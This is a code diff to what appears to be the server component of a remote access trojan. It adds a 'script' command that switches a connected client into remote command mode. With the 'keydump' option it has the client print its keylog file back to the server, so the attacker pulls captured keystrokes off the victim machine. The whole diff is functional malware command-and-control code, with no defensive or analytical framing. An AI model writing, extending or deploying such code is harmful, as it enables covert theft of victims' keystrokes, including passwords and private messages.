@@ -86,6 +86,8 @@ void Server::HandleInput()
 			else
 				General::outputMsg("Please connect to a session with 'connect'", 2);
 		}
+
+
 		else						//handle command when client is selected
 		{
 			if (userinput == "exitSession")
@@ -114,6 +116,10 @@ void Server::HandleInput()
 				General::cmdMode = !General::cmdMode;
 				SendString(currentSessionID, userinput, PacketType::Instruction);
 			}
+			else if (General::processParameter(userinput, "script"))
+			{
+				handleScript(userinput);
+			}
 			else if (General::cmdMode)
 			{
 				SendString(currentSessionID, userinput, PacketType::CMDCommand);
@@ -124,6 +130,25 @@ void Server::HandleInput()
 			}
 		}
 	}
+}
+
+void Server::handleScript(std::string script)		//temporary, will implement client-side version
+{
+	General::outputMsg("Executing script", 1);
+
+	SendString(currentSessionID, (std::string)"remoteControl cmd", PacketType::Instruction);
+	Sleep(2000);
+	if (General::processParameter(script, "keydump"))
+	{
+		General::outputMsg("Dumping Keylogs from " + script, 1);
+		SendString(currentSessionID, "type " + script, PacketType::CMDCommand);
+	}
+	else
+	{
+		General::outputMsg("Script not recognized", 2);
+	}
+
+	SendString(currentSessionID, (std::string)"remoteControl", PacketType::Instruction);
 }
 
 bool Server::ProcessPacket(int ID, PacketType _packettype)
